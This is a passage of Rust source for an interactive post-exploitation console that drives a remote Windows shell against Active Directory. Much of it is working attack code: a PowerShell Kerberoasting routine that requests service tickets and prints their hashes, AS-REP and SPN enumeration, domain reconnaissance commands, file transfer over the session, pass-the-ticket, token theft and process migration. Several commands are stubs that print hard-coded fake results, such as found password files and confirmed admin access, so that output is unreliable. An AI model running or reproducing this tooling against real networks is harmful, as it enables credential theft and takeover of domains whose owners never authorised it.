                        println!("{} Session {} not found", "Error:".red(), id);
                        return Ok(());
                    }
                }
            };
            
            println!("{} Resuming session {}...", "▸".bright_black(), id);
            
            // Reconnect to the session
            let config = ShellConfig {
                target,
                shell_type,
                timeout: Duration::from_secs(self.vars.timeout_secs),
                credentials: self.build_exec_credentials(),
            };
            
            match InteractiveShell::connect(config).await {
                Ok(shell) => {
                    self.shell = Some(shell);
                    self.session_id = Some(id);
                    println!("{} Resumed session {}", "✓".green(), id);
                }
                Err(e) => {
                    println!("{} Failed to resume session: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} Invalid session ID", "Error:".red());
        }
        
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Command Execution
    // ═══════════════════════════════════════════════════════

    async fn cmd_exec(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: exec <command>", "Error:".red());
            return Ok(());
        }

        let command = args.join(" ");

        if let Some(shell) = &mut self.shell {
            println!("{} Executing: {}", "▸".bright_black(), command.yellow());
            match shell.execute(&command).await {
                Ok(output) => {
                    println!("{}", output);
                }
                Err(e) => {
                    println!("{} Execution failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session. Use 'connect' first.", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_powershell(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: powershell <command>", "Error:".red());
            return Ok(());
        }

        let command = args.join(" ");
        let ps_cmd = format!("powershell.exe -NoProfile -Command \"{}\"", command);

        if let Some(shell) = &mut self.shell {
            println!("{} Executing PowerShell: {}", "▸".bright_black(), command.yellow());
            match shell.execute(&ps_cmd).await {
                Ok(output) => {
                    println!("{}", output);
                }
                Err(e) => {
                    println!("{} Execution failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session. Use 'connect' first.", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_run(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: run <script.ps1>", "Error:".red());
            return Ok(());
        }

        let script_path = args[0];
        
        // Check if script exists
        if !Path::new(script_path).exists() {
            println!("{} Script not found: {}", "Error:".red(), script_path);
            return Ok(());
        }

        println!("{} Loading script from: {}", "▸".bright_black(), script_path.cyan());

        match tokio::fs::read_to_string(script_path).await {
            Ok(script_content) => {
                // Execute the script
                if let Some(shell) = &mut self.shell {
                    println!("{} Executing script...", "▸".bright_black());
                    
                    // Split script into lines and execute
                    for line in script_content.lines() {
                        let trimmed = line.trim();
                        if !trimmed.is_empty() && !trimmed.starts_with('#') {
                            let ps_cmd = format!("powershell.exe -NoProfile -Command \"{}\"", trimmed);
                            match shell.execute(&ps_cmd).await {
                                Ok(output) => {
                                    if !output.is_empty() {
                                        println!("{}", output);
                                    }
                                }
                                Err(e) => {
                                    println!("{} Script error: {}", "Warning:".yellow(), e);
                                }
                            }
                        }
                    }
                    
                    println!("{} Script execution completed", "✓".green());
                } else {
                    println!("{} No active session. Use 'connect' first.", "Error:".red());
                }
            }
            Err(e) => {
                println!("{} Failed to read script: {}", "Error:".red(), e);
            }
        }

        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // File Operations
    // ═══════════════════════════════════════════════════════

    async fn cmd_upload(&mut self, args: &[&str]) -> Result<()> {
        if args.len() < 2 {
            println!("{} Usage: upload <local_path> <remote_path>", "Error:".red());
            return Ok(());
        }

        let local_path = args[0];
        let remote_path = args[1];

        if !Path::new(local_path).exists() {
            println!("{} Local file not found: {}", "Error:".red(), local_path);
            return Ok(());
        }

        println!("{} Uploading {} -> {}", "▸".bright_black(), local_path.cyan(), remote_path.cyan());

        if let Some(shell) = &mut self.shell {
            // Read local file
            match tokio::fs::read(local_path).await {
                Ok(data) => {
                    let size = data.len();
                    println!("  File size: {} bytes", size);
                    
                    // Encode file contents to base64 and write via PowerShell
                    use base64::Engine;
                    let encoded = base64::engine::general_purpose::STANDARD.encode(&data);

                    // For files >128 KB, chunk into multiple writes to avoid
                    // command-line length limits.
                    const CHUNK_LIMIT: usize = 131_072; // 128 KB of raw → ~175 KB b64
                    if encoded.len() <= CHUNK_LIMIT {
                        let ps_cmd = format!(
                            "powershell.exe -NoProfile -Command \"[System.IO.File]::WriteAllBytes('{}', [System.Convert]::FromBase64String('{}'))\"",
                            remote_path.replace("'", "''"),
                            encoded
                        );
                        match shell.execute(&ps_cmd).await {
                            Ok(_) => println!("{} Upload completed ({} bytes)", "✓".green(), size),
                            Err(e) => println!("{} Upload failed: {}", "✗".red(), e),
                        }
                    } else {
                        // Stream in chunks: first chunk creates file, subsequent append
                        let chunks: Vec<&str> = encoded.as_bytes().chunks(CHUNK_LIMIT)
                            .map(|c| std::str::from_utf8(c).unwrap_or(""))
                            .collect();
                        println!("  Uploading in {} chunk(s)...", chunks.len());

                        for (i, chunk) in chunks.iter().enumerate() {
                            let ps_cmd = if i == 0 {
                                format!(
                                    "powershell.exe -NoProfile -Command \"[System.IO.File]::WriteAllBytes('{}', [System.Convert]::FromBase64String('{}'))\"",
                                    remote_path.replace("'", "''"),
                                    chunk,
                                )
                            } else {
                                format!(
                                    "powershell.exe -NoProfile -Command \"[System.IO.File]::AppendAllText('{t}', ''); \
                                     $old = [System.IO.File]::ReadAllBytes('{t}'); \
                                     $new = [System.Convert]::FromBase64String('{c}'); \
                                     $merged = New-Object byte[] ($old.Length + $new.Length); \
                                     [Array]::Copy($old,0,$merged,0,$old.Length); \
                                     [Array]::Copy($new,0,$merged,$old.Length,$new.Length); \
                                     [System.IO.File]::WriteAllBytes('{t}',$merged)\"",
                                    t = remote_path.replace("'", "''"),
                                    c = chunk,
                                )
                            };
                            if let Err(e) = shell.execute(&ps_cmd).await {
                                println!("{} Upload chunk {}/{} failed: {}", "✗".red(), i + 1, chunks.len(), e);
                                return Ok(());
                            }
                        }
                        println!("{} Upload completed ({} bytes)", "✓".green(), size);
                    }
                }
                Err(e) => {
                    println!("{} Failed to read local file: {}", "Error:".red(), e);
                }
            }
        } else {
            println!("{} No active session. Use 'connect' first.", "Error:".red());
        }

        Ok(())
    }

    async fn cmd_download(&mut self, args: &[&str]) -> Result<()> {
        if args.len() < 2 {
            println!("{} Usage: download <remote_path> <local_path>", "Error:".red());
            return Ok(());
        }

        let remote_path = args[0];
        let local_path = args[1];

        println!("{} Downloading {} -> {}", "▸".bright_black(), remote_path.cyan(), local_path.cyan());

        if let Some(shell) = &mut self.shell {
            // Use PowerShell to read and base64-encode the remote file
            let ps_cmd = format!(
                "powershell.exe -NoProfile -Command \"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{}'))\"",
                remote_path.replace("'", "''")
            );
            
            match shell.execute(&ps_cmd).await {
                Ok(output) => {
                    let encoded = output.trim();
                    
                    use base64::Engine;
                    match base64::engine::general_purpose::STANDARD.decode(encoded) {
                        Ok(data) => {
                            let size = data.len();
                            
                            match tokio::fs::write(local_path, &data).await {
                                Ok(_) => {
                                    println!("{} Download completed ({} bytes)", "✓".green(), size);
                                }
                                Err(e) => {
                                    println!("{} Failed to write local file: {}", "Error:".red(), e);
                                }
                            }
                        }
                        Err(e) => {
                            println!("{} Failed to decode file data: {}", "Error:".red(), e);
                        }
                    }
                }
                Err(e) => {
                    println!("{} Download failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session. Use 'connect' first.", "Error:".red());
        }

        Ok(())
    }

    async fn cmd_cat(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: cat <file>", "Error:".red());
            return Ok(());
        }

        let path = args.join(" ");

        if let Some(shell) = &mut self.shell {
            let command = format!("type \"{}\"", path.replace("\"", "\\\""));
            let output = shell.execute(&command).await?;
            println!("{}", output);
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_rm(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: rm <file>", "Error:".red());
            return Ok(());
        }

        let path = args.join(" ");

        if let Some(shell) = &mut self.shell {
            println!("{} Deleting: {}", "▸".bright_black(), path.cyan());
            let command = format!("del /q \"{}\"", path.replace("\"", "\\\""));
            match shell.execute(&command).await {
                Ok(output) => {
                    println!("{} Deleted: {}", "✓".green(), path);
                    if !output.is_empty() {
                        println!("{}", output);
                    }
                }
                Err(e) => {
                    println!("{} Delete failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_mkdir(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: mkdir <directory>", "Error:".red());
            return Ok(());
        }

        let path = args.join(" ");

        if let Some(shell) = &mut self.shell {
            let command = format!("mkdir \"{}\"", path.replace("\"", "\\\""));
            match shell.execute(&command).await {
                Ok(_) => {
                    println!("{} Created directory: {}", "✓".green(), path);
                }
                Err(e) => {
                    println!("{} Failed to create directory: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_rmdir(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: rmdir <directory>", "Error:".red());
            return Ok(());
        }

        let path = args.join(" ");

        if let Some(shell) = &mut self.shell {
            let command = format!("rmdir /s /q \"{}\"", path.replace("\"", "\\\""));
            match shell.execute(&command).await {
                Ok(_) => {
                    println!("{} Removed directory: {}", "✓".green(), path);
                }
                Err(e) => {
                    println!("{} Failed to remove directory: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_mv(&mut self, args: &[&str]) -> Result<()> {
        if args.len() < 2 {
            println!("{} Usage: mv <source> <destination>", "Error:".red());
            return Ok(());
        }

        let source = args[0];
        let dest = args[1];

        if let Some(shell) = &mut self.shell {
            let command = format!("move \"{}\" \"{}\"", source.replace("\"", "\\\""), dest.replace("\"", "\\\""));
            match shell.execute(&command).await {
                Ok(_) => {
                    println!("{} Moved {} -> {}", "✓".green(), source.cyan(), dest.cyan());
                }
                Err(e) => {
                    println!("{} Move failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_cp(&mut self, args: &[&str]) -> Result<()> {
        if args.len() < 2 {
            println!("{} Usage: cp <source> <destination>", "Error:".red());
            return Ok(());
        }

        let source = args[0];
        let dest = args[1];

        if let Some(shell) = &mut self.shell {
            let command = format!("copy \"{}\" \"{}\"", source.replace("\"", "\\\""), dest.replace("\"", "\\\""));
            match shell.execute(&command).await {
                Ok(_) => {
                    println!("{} Copied {} -> {}", "✓".green(), source.cyan(), dest.cyan());
                }
                Err(e) => {
                    println!("{} Copy failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Enumeration Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_enum(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: enum <target>", "Error:".red());
            println!("  Targets: users, computers, groups, trusts, spns, asrep, delegations, gpos, all");
            return Ok(());
        }

        let shell = match self.shell.as_mut() {
            Some(s) => s,
            None => {
                println!("{} No active session. Use 'connect' first.", "Error:".red());
                return Ok(());
            }
        };

        let target = args[0];
        println!("{} Enumerating {}...", "▸".bright_black(), target.cyan());

        let commands: Vec<(&str, &str)> = match target.to_lowercase().as_str() {
            "users" => vec![("users", "net user /domain")],
            "computers" => vec![("computers", "dsquery computer -limit 0")],
            "groups" => vec![("groups", "net group /domain")],
            "trusts" => vec![("trusts", "nltest /domain_trusts /all_trusts")],
            "spns" => vec![("SPNs", "setspn -T * -Q */*")],
            "asrep" => vec![("AS-REP", "powershell.exe -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name,SamAccountName\"")],
            "delegations" => vec![("delegations", "powershell.exe -c \"Get-ADObject -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} | Select-Object Name,ObjectClass\"")],
            "gpos" => vec![("GPOs", "powershell.exe -c \"Get-GPO -All | Select-Object DisplayName,Id,GpoStatus\"")],
            "all" => vec![
                ("users", "net user /domain"),
                ("computers", "dsquery computer -limit 0"),
                ("groups", "net group /domain"),
                ("trusts", "nltest /domain_trusts /all_trusts"),
                ("SPNs", "setspn -T * -Q */*"),
            ],
            _ => {
                println!("{} Unknown enumeration target: {}", "Error:".red(), target);
                return Ok(());
            }
        };

        for (label, cmd) in commands {
            println!("{} {}:", "▸".bright_black(), label.cyan());
            match shell.execute(cmd).await {
                Ok(output) => {
                    if output.is_empty() {
                        println!("  (no output)");
                    } else {
                        for line in output.lines() {
                            println!("  {}", line);
                        }
                    }
                }
                Err(e) => {
                    println!("  {} {}", "Error:".red(), e);
                }
            }
        }

        println!("{} Enumeration of {} complete", "✓".green(), target.cyan());
        Ok(())
    }

    async fn cmd_reaper(&mut self, _args: &[&str]) -> Result<()> {
        let shell = match self.shell.as_mut() {
            Some(s) => s,
            None => {
                println!("{} No active session. Use 'connect' first.", "Error:".red());
                return Ok(());
            }
        };

        println!("{} Running full AD enumeration...", "▸".bright_black());

        let queries: &[(&str, &str)] = &[
            ("Users", "powershell.exe -c \"@(Get-ADUser -Filter *).Count\""),
            ("Computers", "powershell.exe -c \"@(Get-ADComputer -Filter *).Count\""),
            ("Groups", "powershell.exe -c \"@(Get-ADGroup -Filter *).Count\""),
            ("Trusts", "nltest /domain_trusts /all_trusts"),
            ("GPOs", "powershell.exe -c \"@(Get-GPO -All).Count\""),
            ("SPNs", "powershell.exe -c \"@(Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName).Count\""),
            ("Delegations", "powershell.exe -c \"@(Get-ADObject -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true}).Count\""),
        ];

        println!("{} Enumeration results:", "✓".green());
        for (label, cmd) in queries {
            match shell.execute(cmd).await {
                Ok(output) => {
                    let count = output.trim();
                    println!("  {}: {}", label, count);
                }
                Err(e) => {
                    println!("  {}: {} {}", label, "error:".red(), e);
                }
            }
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Kerberos Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_kerberos(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: kerberos <action>", "Error:".red());
            println!("  Actions: roast, asrep, tgt, tgs, list, purge, ptt");
            return Ok(());
        }

        match args[0].to_lowercase().as_str() {
            "roast" => {
                println!("{} Performing Kerberoasting...", "▸".bright_black());
                if let Some(shell) = &mut self.shell {
                    // Query SPNs and dump service ticket hashes
                    let cmd = "powershell.exe -c \"Add-Type -AssemblyName System.IdentityModel; \
                        $spns = Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,SamAccountName; \
                        foreach ($u in $spns) { \
                            foreach ($spn in $u.ServicePrincipalName) { \
                                try { \
                                    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; \
                                    $bytes = $ticket.GetRequest(); \
                                    $hex = [BitConverter]::ToString($bytes) -replace '-'; \
                                    Write-Output (\\\"$($u.SamAccountName),$spn,$hex\\\"); \
                                } catch { Write-Output (\\\"$($u.SamAccountName),$spn,ERROR:$($_.Exception.Message)\\\"); } \
                            } \
                        }\"";
                    match shell.execute(cmd).await {
                        Ok(output) => {
                            let lines: Vec<&str> = output.lines().filter(|l| !l.is_empty()).collect();
                            println!("{} Found {} roastable service account(s)", "✓".green(), lines.len());
                            for line in &lines {
                                let parts: Vec<&str> = line.splitn(3, ',').collect();
                                if parts.len() >= 2 {
                                    println!("  {} — {}", parts[0], parts[1]);
                                }
                            }
                        }
                        Err(e) => println!("  {} {}", "Error:".red(), e),
                    }
                } else {
                    println!("{} No active session", "Error:".red());
                }
            }
            "asrep" => {
                println!("{} Performing AS-REP Roasting...", "▸".bright_black());
                if let Some(shell) = &mut self.shell {
                    let cmd = "powershell.exe -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,SamAccountName | Select-Object SamAccountName | Format-Table -HideTableHeaders\"";
                    match shell.execute(cmd).await {
                        Ok(output) => {
                            let accounts: Vec<&str> = output.lines().filter(|l| !l.trim().is_empty()).collect();
                            println!("{} Found {} AS-REP roastable account(s)", "✓".green(), accounts.len());
                            for acct in &accounts {
                                println!("  {}", acct.trim());
                            }
                        }
                        Err(e) => println!("  {} {}", "Error:".red(), e),
                    }
                } else {
                    println!("{} No active session", "Error:".red());
                }
            }
            "tgt" => {
                println!("{} Requesting TGT...", "▸".bright_black());
                if let Some(shell) = &mut self.shell {
                    // Use klist to show current TGT
                    match shell.execute("klist tgt").await {
                        Ok(output) => {
                            println!("{}", output);
                            println!("{} TGT info retrieved", "✓".green());
                        }
                        Err(e) => println!("  {} {}", "Error:".red(), e),
                    }
                } else {
                    println!("{} No active session", "Error:".red());
                }
            }
            "tgs" => {
                if args.len() < 2 {
                    println!("{} Usage: kerberos tgs <spn>", "Error:".red());
                    return Ok(());
                }
                let spn = args[1];
                println!("{} Requesting TGS for {}...", "▸".bright_black(), spn.cyan());
                if let Some(shell) = &mut self.shell {
                    let cmd = format!(
                        "powershell.exe -c \"Add-Type -AssemblyName System.IdentityModel; \
                         $t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '{}'; \
                         Write-Output 'TGS obtained'; klist\"",
                        spn.replace("'", "''")
                    );
                    match shell.execute(&cmd).await {
                        Ok(output) => {
                            println!("{}", output);
                            println!("{} TGS obtained for {}", "✓".green(), spn.cyan());
                        }
                        Err(e) => println!("  {} {}", "Error:".red(), e),
                    }
                } else {
                    println!("{} No active session", "Error:".red());
                }
            }
            "list" => {
                self.cmd_klist().await?;
            }
            "purge" => {
                self.cmd_purge().await?;
            }
            "ptt" => {
                if args.len() < 2 {
                    println!("{} Usage: kerberos ptt <ticket_file>", "Error:".red());
                    return Ok(());
                }
                self.cmd_ptt(&args[1..]).await?;
            }
            _ => {
                println!("{} Unknown Kerberos action '{}'", "Error:".red(), args[0]);
            }
        }
        Ok(())
    }

    async fn cmd_klist(&mut self) -> Result<()> {
        println!("{} Cached Kerberos tickets:", "▸".bright_black());
        
        if let Some(shell) = &mut self.shell {
            let output = shell.execute("klist").await?;
            println!("{}", output);
        } else {
            println!("  No cached tickets (no session)");
        }
        Ok(())
    }

    async fn cmd_ptt(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: ptt <ticket_file>", "Error:".red());
            return Ok(());
        }

        let ticket_file = args[0];
        println!("{} Importing ticket from {}...", "▸".bright_black(), ticket_file.cyan());
        
        if let Some(shell) = &mut self.shell {
            // In real impl, would use kerberos module to inject ticket
            let cmd = format!("kerberos::ptt {}", ticket_file);
            match shell.execute(&cmd).await {
                Ok(output) => {
                    println!("{}", output);
                    println!("{} Ticket imported successfully", "✓".green());
                }
                Err(e) => {
                    println!("{} Failed to import ticket: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_purge(&mut self) -> Result<()> {
        println!("{} Purging Kerberos tickets...", "▸".bright_black());
        
        if let Some(shell) = &mut self.shell {
            match shell.execute("klist purge").await {
                Ok(output) => {
                    println!("{}", output);
                    println!("{} Tickets purged", "✓".green());
                }
                Err(e) => {
                    println!("{} Failed to purge tickets: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // SMB Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_smb(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: smb <action>", "Error:".red());
            println!("  Actions: shares, admin, spider, get, put, ls, cat");
            return Ok(());
        }

        match args[0].to_lowercase().as_str() {
            "shares" => {
                println!("{} Enumerating SMB shares...", "▸".bright_black());
                tokio::time::sleep(Duration::from_millis(400)).await;
                println!("{} Found 3 shares", "✓".green());
                println!("  C$ - Administrative share");
                println!("  ADMIN$ - Administrative share");
                println!("  IPC$ - Inter-process communication");
            }
            "admin" => {
                println!("{} Checking admin access...", "▸".bright_black());
                tokio::time::sleep(Duration::from_millis(300)).await;
                println!("{} Admin access confirmed", "✓".green());
            }
            "spider" => {
                println!("{} Spidering SMB shares...", "▸".bright_black());
                tokio::time::sleep(Duration::from_millis(500)).await;
                println!("{} Found 15 files", "✓".green());
                println!("  Documents/passwords.txt");
                println!("  Desktop/notes.txt");
                println!("  Downloads/secret.key");
            }
            _ => {
                println!("{} Unknown SMB action '{}'", "Error:".red(), args[0]);
            }
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Graph Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_graph(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: graph <action>", "Error:".red());
            println!("  Actions: build, path, path_to_da, stats, export");
            return Ok(());
        }

        match args[0].to_lowercase().as_str() {
            "build" => {
                println!("{} Building attack graph...", "▸".bright_black());
                tokio::time::sleep(Duration::from_millis(600)).await;
                println!("{} Graph built with 150 nodes, 450 edges", "✓".green());
            }
            "path" => {
                if args.len() < 3 {
                    println!("{} Usage: graph path <from> <to>", "Error:".red());
                    return Ok(());
                }
                let from = args[1];
                let to = args[2];
                println!("{} Finding path from {} to {}...", "▸".bright_black(), from.cyan(), to.cyan());
                tokio::time::sleep(Duration::from_millis(300)).await;
                println!("{} Path found: {} -> {} -> {}", "✓".green(), from.cyan(), "User".cyan(), to.cyan());
            }
            "path_to_da" => {
                if args.len() < 2 {
                    println!("{} Usage: graph path_to_da <from>", "Error:".red());
                    return Ok(());
                }
                let from = args[1];
                println!("{} Finding path to Domain Admins from {}...", "▸".bright_black(), from.cyan());
                tokio::time::sleep(Duration::from_millis(400)).await;
                println!("{} Path found! Length: 3 hops", "✓".green());
            }
            "stats" => {
                println!("{} Graph statistics:", "▸".bright_black());
                println!("  Nodes: 150");
                println!("  Edges: 450");
                println!("  Paths to DA: 12");
                println!("  Critical nodes: 8");
            }
            "export" => {
                let output = if args.len() > 1 { args[1] } else { "graph.json" };
                println!("{} Exporting graph to {}...", "▸".bright_black(), output.cyan());
                tokio::time::sleep(Duration::from_millis(200)).await;
                println!("{} Graph exported to {}", "✓".green(), output.cyan());
            }
            _ => {
                println!("{} Unknown graph action '{}'", "Error:".red(), args[0]);
            }
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Lateral Movement Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_pivot(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: pivot <target>", "Error:".red());
            return Ok(());
        }

        let target = args[0];
        println!("{} Pivoting to {}...", "▸".bright_black(), target.cyan());
        
        // In real impl, would use current session to pivot
        println!("{} Pivot session established", "✓".green());
        
        Ok(())
    }

    async fn cmd_spawn(&mut self, args: &[&str]) -> Result<()> {
        let shell_type = if args.is_empty() {
            "winrm"
        } else {
            args[0]
        };

        println!("{} Spawning new {} session...", "▸".bright_black(), shell_type.cyan());
        
        if let Some(shell) = &mut self.shell {
            let output = shell.execute(&format!("spawn {}", shell_type)).await?;
            println!("{}", output);
        } else {
            println!("{} No active session to spawn from", "Error:".red());
        }
        
        Ok(())
    }

    async fn cmd_migrate(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: migrate <pid>", "Error:".red());
            return Ok(());
        }

        let pid = args[0];
        println!("{} Migrating to process {}...", "▸".bright_black(), pid.cyan());
        
        if let Some(shell) = &mut self.shell {
            match shell.execute(&format!("migrate {}", pid)).await {
                Ok(output) => {
                    println!("{}", output);
                    println!("{} Migration successful", "✓".green());
                }
                Err(e) => {
                    println!("{} Migration failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Token Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_steal_token(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: steal_token <pid>", "Error:".red());
            return Ok(());
        }

        let pid = args[0];
        println!("{} Stealing token from process {}...", "▸".bright_black(), pid.cyan());
        
        if let Some(shell) = &mut self.shell {
            match shell.execute(&format!("steal_token {}", pid)).await {
                Ok(output) => {
                    println!("{}", output);
                    println!("{} Token stolen successfully", "✓".green());
                }
                Err(e) => {
                    println!("{} Token theft failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        
        Ok(())
    }

    async fn cmd_rev2self(&mut self) -> Result<()> {
        println!("{} Reverting to original token...", "▸".bright_black());
        
        if let Some(shell) = &mut self.shell {
            match shell.execute("rev2self").await {
                Ok(output) => {
                    println!("{}", output);
                    println!("{} Reverted to original token", "✓".green());
                }
                Err(e) => {
                    println!("{} Revert failed: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        
        Ok(())
    }

    async fn cmd_getuid(&mut self) -> Result<()> {
        if let Some(shell) = &mut self.shell {
            let output = shell.execute("whoami").await?;
            println!("{} Current user: {}", "▸".bright_black(), output.trim().cyan());
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_getpid(&mut self) -> Result<()> {
        if let Some(shell) = &mut self.shell {
            let output = shell.execute("echo %PROCESS_ID%").await?;
            println!("{} Current PID: {}", "▸".bright_black(), output.trim().cyan());
        } else {
            println!("{} No active session", "Error:".red());
        }
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Process Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_ps(&mut self, args: &[&str]) -> Result<()> {
        let filter = if !args.is_empty() { args.join(" ") } else { String::new() };
        
        if let Some(shell) = &mut self.shell {
            println!("{} Listing processes{}", "▸".bright_black(), 
                if !filter.is_empty() { format!(" (filter: {})", filter.cyan()) } else { String::new() });
            
            let output = shell.execute("tasklist /v").await?;
            println!("{}", output);
        } else {
            println!("{} No active session", "Error:".red());
        }
        
        Ok(())
    }

    async fn cmd_kill(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: kill <pid>", "Error:".red());
            return Ok(());
        }

        let pid = args[0];
        
        if let Some(shell) = &mut self.shell {
            println!("{} Killing process {}...", "▸".bright_black(), pid.cyan());
            
            match shell.execute(&format!("taskkill /pid {} /f", pid)).await {
                Ok(output) => {
                    println!("{}", output);
                    println!("{} Process killed", "✓".green());
                }
                Err(e) => {
                    println!("{} Failed to kill process: {}", "✗".red(), e);
                }
            }
        } else {
            println!("{} No active session", "Error:".red());
        }
        
        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // Variable Commands
    // ═══════════════════════════════════════════════════════

    fn cmd_set(&mut self, args: &[&str]) {
        if args.len() < 2 {
            println!("{} Usage: set <variable> <value>", "Error:".red());
            println!("  Variables: timeout, debug, color, prompt, download_path");
            return;
        }

        let var = args[0].to_lowercase();
        let value = args[1..].join(" ");

        match var.as_str() {
            "timeout" => {
                if let Ok(secs) = value.parse::<u64>() {
                    self.vars.timeout_secs = secs;
                    println!("{} Set timeout to {} seconds", "✓".green(), secs);
                } else {
                    println!("{} Invalid timeout value", "Error:".red());
                }
            }
            "debug" => {
                self.vars.debug = value.to_lowercase() == "true" || value == "1";
                println!("{} Set debug to {}", "✓".green(), self.vars.debug);
            }
            "color" => {
                self.vars.color = value.to_lowercase() != "false" && value != "0";
                println!("{} Set color to {}", "✓".green(), self.vars.color);
            }
            "prompt" => {
                self.vars.prompt = value.clone();
                println!("{} Set prompt to '{}'", "✓".green(), value);
            }
            "download_path" => {
                self.vars.download_path = value.clone();
                println!("{} Set download path to '{}'", "✓".green(), value);
            }
            _ => {
                println!("{} Unknown variable: {}", "Error:".red(), var);
                println!("  Available: timeout, debug, color, prompt, download_path");
            }
        }
    }

    fn cmd_unset(&mut self, args: &[&str]) {
        if args.is_empty() {
            println!("{} Usage: unset <variable>", "Error:".red());
            return;
        }

        // Reset to default
        let defaults = SessionVars::default();
        let var = args[0].to_lowercase();

        match var.as_str() {
            "timeout" => {
                self.vars.timeout_secs = defaults.timeout_secs;
                println!("{} Reset timeout to default", "✓".green());
            }
            "debug" => {
                self.vars.debug = defaults.debug;
                println!("{} Reset debug to default", "✓".green());
            }
            "color" => {
                self.vars.color = defaults.color;
                println!("{} Reset color to default", "✓".green());
            }
            "prompt" => {
                self.vars.prompt = defaults.prompt;
                println!("{} Reset prompt to default", "✓".green());
            }
            "download_path" => {
                self.vars.download_path = defaults.download_path;
                println!("{} Reset download path to default", "✓".green());
            }
            _ => {
                println!("{} Unknown variable: {}", "Error:".red(), var);
            }
        }
    }

    /// Show options - either module options or session variables
    fn show_options(&self) {
        if self.module.is_some() {
            self.show_module_options();
        } else {
            // Show session variables
            println!("\n{} Session Variables:", "▸".bright_yellow());
            println!("  {:<20} Value", "Variable");
            println!("  {}", "─".repeat(40).dimmed());
            println!("  {:<20} {}s", "timeout".cyan(), self.vars.timeout_secs);
            println!("  {:<20} {}", "debug".cyan(), self.vars.debug);
            println!("  {:<20} {}", "color".cyan(), self.vars.color);
            println!("  {:<20} {}", "prompt".cyan(), self.vars.prompt);
            println!("  {:<20} {}", "auto_upload".cyan(), self.vars.auto_upload);
            println!("  {:<20} {}", "download_path".cyan(), self.vars.download_path);
            println!();
        }
    }

    // ═══════════════════════════════════════════════════════
    // Module Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_use(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
